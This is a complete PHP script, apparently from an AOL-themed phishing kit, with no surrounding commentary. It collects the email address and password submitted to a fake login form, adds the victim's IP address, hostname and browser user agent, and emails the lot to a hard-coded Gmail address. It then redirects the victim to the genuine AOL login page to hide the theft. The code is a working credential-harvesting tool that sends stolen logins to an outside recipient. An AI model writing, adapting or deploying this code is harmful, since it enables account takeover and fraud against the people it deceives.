<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| AOL E M A I L  |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Unknown  --------------|\n";
$send = "krayondonbalour7@gmail.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://login.aol.com/?.src=guce-mail&lang=&done=https%3A%2F%2Fmail.aol.com%2Fen-gb%3Frp%3Dwebmail-std%252Fen-gb%252Fbasic");
}else{
header ("Location: index.php");
}

?>